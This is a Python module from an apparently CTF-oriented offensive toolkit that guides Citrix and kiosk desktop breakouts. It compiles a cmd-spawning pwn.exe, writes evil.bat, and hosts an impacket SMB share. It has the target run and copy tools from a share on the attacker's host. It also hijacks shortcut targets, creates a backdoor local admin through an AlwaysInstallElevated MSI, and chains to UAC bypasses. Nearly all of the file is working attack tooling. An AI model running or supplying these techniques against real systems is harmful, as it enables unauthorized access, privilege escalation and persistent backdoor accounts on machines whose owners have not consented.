import shutil
import subprocess
from pathlib import Path

from core.paths import get_windows_tools_dir
from core.target import load_current_profile, get_active_cred
from core.attacker import resolve_lhost


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

DIM = '\033[2m'

SHARE_NAME = "share"

#
# Tools we might already have locally that are worth bundling into the
# SMB share alongside the generated ones. Bypass-UAC.ps1 is deliberately
# not sought here - ctf privesc.windows.privileges.uac already implements
# a working, tested UAC bypass (UACMe #54), so that's the recommended
# path instead of chasing down a copy of this specific script.
#
BUNDLE_TOOLS = ("PowerUp.ps1", "Explorer++.exe", "winPEASx64.exe")

PWN_C_SOURCE = r'''#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
'''

TECHNIQUES = {

    "unc": "Dialog box -> UNC path to the local admin share (\\\\127.0.0.1\\c$\\...)",
    "smb": "Dialog box -> attacker-hosted SMB share (pull tools in, execute in place)",
    "altexplorer": "Alternate file explorer (Explorer++ / Q-Dir) - bypasses folder GPO restrictions",
    "altregedit": "Alternate registry editor - bypasses regedit.exe GPO block",
    "shortcut": "Modify/create a shortcut (.lnk) target to spawn cmd.exe",
    "script": "Drop an auto-executing script (evil.bat)",
    "installelevated": "AlwaysInstallElevated -> MSI privesc (PowerUp.ps1 Write-UserAddMSI)",
    "uacbypass": "UAC bypass once local admin (backdoor account still hits UAC)",

}


# ==========================================
# HELPERS
# ==========================================

def _header(label):

    #
    # Technique descriptions are arbitrary-length free text, not a fixed-
    # width field - fitting them inside the box border breaks alignment
    # the same way privileges/uac.py's drop-directory field did. Keep the
    # box itself short/constant and print the description below it.
    #
    print(f"\n{B}┌── MODULE: CITRIX / KIOSK BREAKOUT " + "─" * 23 + f"┐{W}")
    print(f"{B}└" + "─" * 59 + f"┘{W}")
    print(f"{B}Technique:{W} {C}{label}{W}")


def _section(title):
    print(f"\n{B}[*] {title}{W}")


def _step(n, title, why=None):

    print(f"\n{B}[{n}]{W} {title}")

    if why:
        print(f"    {why}")


def _cmd(*lines):

    print()

    for line in lines:

        if line.startswith("#"):
            print(f"    {DIM}{line}{W}")
        elif "#" in line:
            code, comment = line.split("#", 1)
            print(f"    {Y}{code.rstrip()}{W}  {DIM}#{comment}{W}")
        else:
            print(f"    {Y}{line}{W}")


def _ask(prompt, default_yes=True, optional=False):

    #
    # Yellow [?] marks a genuinely skippable extra, not just any
    # default-to-no question - safety gates stay blue.
    #
    marker = Y if optional else B

    raw = input(f"\n{marker}[?]{W} {prompt}").strip().lower()

    if default_yes:
        return raw in ("", "y", "yes")

    return raw in ("y", "yes")


def _resolve_context():

    try:
        data, _ = load_current_profile()
    except Exception:
        data = {}

    ip = resolve_lhost(args=None, data=data)

    user = None

    try:
        user = get_active_cred(data).get("user")
    except Exception:
        pass

    return ip, user


def _existing_bundle_tools():

    tools_dir = get_windows_tools_dir()
    return [tools_dir / name for name in BUNDLE_TOOLS if (tools_dir / name).is_file()]


def _compile_pwn_exe(work_dir):

    c_path = work_dir / "pwn.c"
    c_path.write_text(PWN_C_SOURCE)

    compiler = shutil.which("i686-w64-mingw32-gcc") or shutil.which("x86_64-w64-mingw32-gcc")

    if not compiler:

        print(f"{Y}[!] No mingw-w64 cross-compiler found - pwn.c staged as source only.{W}")
        print(f"{Y}[!] Compile it yourself: i686-w64-mingw32-gcc pwn.c -o pwn.exe{W}")

        return c_path, None

    exe_path = work_dir / "pwn.exe"

    print(f"\n{B}[*] Compiling pwn.c with {compiler}...{W}")

    result = subprocess.run(
        [compiler, str(c_path), "-o", str(exe_path)],
        capture_output=True,
        text=True,
    )

    if result.returncode != 0 or not exe_path.is_file():

        print(f"{R}[-] Compilation failed:{W}")
        print(result.stderr.strip())

        return c_path, None

    print(f"{G}[+] Compiled {exe_path}{W}")

    return c_path, exe_path


def _build_share_dir():

    #
    # A dedicated subdirectory rather than dropping into cwd directly -
    # this becomes the SMB share root, so only what's meant to be exposed
    # to the restricted desktop ends up in it.
    #
    share_dir = Path.cwd() / "citrix_share"
    share_dir.mkdir(exist_ok=True)

    (share_dir / "evil.bat").write_text("cmd\r\n")

    _compile_pwn_exe(share_dir)

    for tool in _existing_bundle_tools():
        shutil.copy2(tool, share_dir / tool.name)

    missing = [name for name in BUNDLE_TOOLS if not (share_dir / name).is_file()]

    if missing:
        print(f"\n{Y}[!] Not bundled (missing from {get_windows_tools_dir()}): {', '.join(missing)} - obtain manually if needed.{W}")

    print(f"\n{G}[+] Share directory ready: {share_dir}{W}")
    print(f"{DIM}    Contents: {', '.join(sorted(p.name for p in share_dir.iterdir()))}{W}")

    return share_dir


def _start_smb_share(directory):

    try:

        subprocess.Popen(
            ["x-terminal-emulator", "-e", f"bash -c 'impacket-smbserver {SHARE_NAME} \"{directory}\" -smb2support; exec bash'"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(f"{G}[+] Started SMB share '{SHARE_NAME}' -> {directory} in a new terminal{W}")

    except Exception as e:

        print(f"{R}[-] Failed to start SMB share: {e}{W}")
        print(f"{Y}[!] Start one yourself: impacket-smbserver {SHARE_NAME} \"{directory}\" -smb2support{W}")


# ==========================================
# TECHNIQUES
# ==========================================

def _technique_unc(ip, user):

    _header(TECHNIQUES["unc"])

    _section("Get a dialog box")

    print(f"    {B}[*]{W} Any app feature that touches the filesystem works: Save, Save As, Open, Load,")
    print(f"        Browse, Import, Export, Help, Search, Scan, Print. Paint's File > Open is the")
    print(f"        classic example - Start Menu -> Paint -> File -> Open.")

    _step(
        1,
        "In the File name field, enter a UNC path to the local admin share",
        "Set File Type to \"All Files\" first, or the dialog will filter out most of what you want to see.",
    )
    _cmd(rf"\\127.0.0.1\c$\Users\{user or '<USER>'}")

    print()
    print(f"    {B}[*]{W} This is still the local machine's own C: drive via the admin share - it sidesteps")
    print(f"        the Explorer/GPO folder restriction, not a network hop. Browse from there to whatever")
    print(f"        you actually need (Desktop, Downloads, ...).")


def _technique_smb(ip, user):

    _header(TECHNIQUES["smb"])

    _section("Setup")

    share_dir = None

    if _ask("Build a share directory now (evil.bat, compiled pwn.exe, any bundled tools found locally)? [Y/n]: "):
        share_dir = _build_share_dir()

    if share_dir and _ask(f"Start the SMB share ('{SHARE_NAME}') now? [Y/n]: "):
        _start_smb_share(share_dir)

    _section("Execute on target")

    _step(
        1,
        "Get a dialog box (Paint File > Open, etc.), set File Type to \"All Files\"",
        "Same entry point as the local UNC technique - any filesystem-touching feature works.",
    )

    _step(2, "Enter the UNC path to your share")
    _cmd(rf"\\{ip or '<ATTACKER-IP>'}\{SHARE_NAME}")

    print()
    print(f"    {B}[*]{W} Direct copy/paste is usually blocked by the same restrictions. Right-click an")
    print(f"        .exe in the share and choose \"Open\" instead - it runs in place. That's how pwn.exe")
    print(f"        gets you a cmd.exe console (it's just system(\"cmd.exe\") - see pwn.c in the share).")

    _step(
        3,
        "Once you have cmd, pull whatever else you need from the same share",
        "Copy now works fine from an actual command prompt, even though Explorer blocked it.",
    )
    _cmd(f'copy \\\\{ip or "<ATTACKER-IP>"}\\{SHARE_NAME}\\PowerUp.ps1 .')


def _technique_altexplorer():

    _header(TECHNIQUES["altexplorer"])

    tools_dir = get_windows_tools_dir()
    explorer = tools_dir / "Explorer++.exe"

    if explorer.is_file():
        print(f"\n{G}[+] Found locally: {explorer} - include it when building the SMB share (smb technique).{W}")
    else:
        print(f"\n{Y}[!] Not present locally ({explorer}) - obtain the portable Explorer++ (or Q-Dir) build manually.{W}")

    _section("Why this works")

    print(f"    {B}[*]{W} Folder-browsing restrictions are enforced by File Explorer itself (via GPO), not")
    print(f"        by the filesystem ACLs. A different file manager - especially a portable one that")
    print(f"        needs no install - simply isn't subject to that policy and browses normally.")

    _section("Execute on target")

    _step(1, "Get Explorer++.exe onto the box", "Via the SMB share technique, or a UNC path to wherever it's staged.")
    _cmd(".\\Explorer++.exe")

    _step(2, "Browse and copy freely from within it - including from a UNC/SMB path")


def _technique_altregedit():

    _header(TECHNIQUES["altregedit"])

    _section("Why this works")

    print(f"    {B}[*]{W} Same principle as the alternate explorer technique - GPO blocks regedit.exe")
    print(f"        specifically, not the registry APIs it calls. A different GUI registry editor")
    print(f"        (SmallRegistryEditor, Uberregedit, Simpleregedit) isn't covered by that policy.")

    print(f"\n{Y}[!] None of these are bundled here - portable, single-exe tools, obtain manually.{W}")
    print(f"{DIM}    (reg.exe from a cmd.exe you've already broken out to works too, and needs nothing extra.){W}")


def _technique_shortcut():

    _header(TECHNIQUES["shortcut"])

    _section("Option A - modify an existing shortcut")

    _step(1, "Right-click any .lnk file on the Desktop/Start Menu -> Properties")
    _step(2, "Change the Target field to a native executable")
    _cmd(r"C:\Windows\System32\cmd.exe")
    _step(3, "Save, then double-click the shortcut to run it")

    _section("Option B - create a new shortcut with PowerShell")

    print(f"    {B}[*]{W} Only useful if you already have some script execution - e.g. via the .bat technique")
    print(f"        or an existing PowerShell prompt.")

    _cmd(
        "$WshShell = New-Object -ComObject WScript.Shell",
        '$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\\Desktop\\My_Shortcut.lnk")',
        '$Shortcut.TargetPath = "C:\\Windows\\System32\\cmd.exe"',
        "$Shortcut.Save()",
    )

    _section("Option C - transfer an existing .lnk via the SMB share technique")
    print(f"    {DIM}Run this module again with the 'smb' technique if you don't have one to start from.{W}")


def _technique_script():

    _header(TECHNIQUES["script"])

    _section("Setup")

    script_path = Path.cwd() / "evil.bat"

    if _ask(f"Write evil.bat locally ({script_path})? [Y/n]: "):

        script_path.write_text("cmd\r\n")
        print(f"{G}[+] Wrote {script_path}{W}")

    _section("Execute on target")

    _step(
        1,
        "Get evil.bat onto the box",
        "Via the SMB share technique, or create it directly with Notepad if you already have any text-editor access - contents are just the single word \"cmd\".",
    )

    _step(2, "Run it - any extension configured to auto-execute via its interpreter works the same way (.bat/.vbs/.ps1)")
    _cmd(".\\evil.bat")


def _technique_installelevated():

    _header(TECHNIQUES["installelevated"])

    tools_dir = get_windows_tools_dir()
    powerup = tools_dir / "PowerUp.ps1"

    if powerup.is_file():
        print(f"\n{G}[+] Found locally: {powerup} - include it when building the SMB share (smb technique).{W}")
    else:
        print(f"\n{Y}[!] PowerUp.ps1 not present locally ({powerup}) - obtain it manually, or check manually with reg query below.{W}")

    _section("Confirm the precondition")

    _step(1, "Check AlwaysInstallElevated in both hives - both must be 1")
    _cmd(
        "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
        "# Or, once you have PowerUp.ps1: Import-Module .\\PowerUp.ps1 ; Get-RegistryAlwaysInstallElevated",
    )

    _section("Exploit")

    username = input(f"\n{B}[?]{W} Backdoor username [{C}backdoor{W}]: ").strip() or "backdoor"
    password = input(f"{B}[?]{W} Backdoor password [{C}T3st@123{W}]: ").strip() or "T3st@123"

    _step(
        2,
        "Generate a privileged MSI that adds a local admin on install",
        "Password must meet complexity requirements or the install silently fails.",
    )
    _cmd(
        "Import-Module .\\PowerUp.ps1",
        f'Write-UserAddMSI -UserName "{username}" -Password "{password}"',
        "# Older PowerUp versions take no arguments and prompt via GUI instead - Write-UserAddMSI",
    )

    _step(3, "Run the generated MSI (UserAdd.msi) - double-click it, or:")
    _cmd("msiexec /quiet /qn /i UserAdd.msi")

    _step(4, f"Get a session as the new admin - still Medium integrity, UAC still applies")
    _cmd(f'runas /user:{username} cmd')

    print()
    print(f"    {B}[*]{W} Local admin group membership alone doesn't bypass UAC - see the uacbypass technique next.")


def _technique_uacbypass():

    _header(TECHNIQUES["uacbypass"])

    _section("Use the existing UAC bypass module")

    print(f"    {B}[*]{W} ctfkit already has a tested UACMe-based bypass (technique #54, SystemPropertiesAdvanced.exe")
    print(f"        DLL search-order hijack) rather than chasing down a copy of Bypass-UAC.ps1 specifically -")
    print(f"        same outcome (Medium -> High integrity token), already staged/verified.")

    _cmd("Run: ctf privesc.windows.privileges.uac")

    _section("If you specifically have Bypass-UAC.ps1 available instead")

    print(f"\n{Y}[!] Not bundled here - HTB's own reference script, obtain manually if you want this exact one.{W}")

    _cmd(
        "Import-Module .\\Bypass-UAC.ps1",
        "Bypass-UAC -Method UacMethodSysprep",
    )

    print()
    print(f"    {B}[*]{W} Confirm afterward with: whoami /priv   (or whoami /groups for the integrity level)")


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    ip, user = _resolve_context()

    technique = None

    if hasattr(args, "extra") and args.extra:
        candidate = args.extra[0].lower()
        if candidate in TECHNIQUES:
            technique = candidate

    if technique is None:

        print(f"\n{B}[*] Citrix / restricted-desktop breakout - pick a technique{W}")
        print(f"{DIM}    (situational - use whichever matches what's actually reachable in the lockdown){W}")

        keys = list(TECHNIQUES.keys())

        for i, key in enumerate(keys, start=1):
            print(f"  {C}[{i}]{W} {TECHNIQUES[key]}")

        raw = input(f"\n{B}[?]{W} Pick a technique [1-{len(keys)}]: ").strip()

        technique = keys[int(raw) - 1] if raw.isdigit() and 1 <= int(raw) <= len(keys) else None

    if not technique:
        print(f"{R}[-] No technique selected.{W}")
        return

    dispatch = {
        "unc": lambda: _technique_unc(ip, user),
        "smb": lambda: _technique_smb(ip, user),
        "altexplorer": _technique_altexplorer,
        "altregedit": _technique_altregedit,
        "shortcut": _technique_shortcut,
        "script": _technique_script,
        "installelevated": _technique_installelevated,
        "uacbypass": _technique_uacbypass,
    }

    dispatch[technique]()
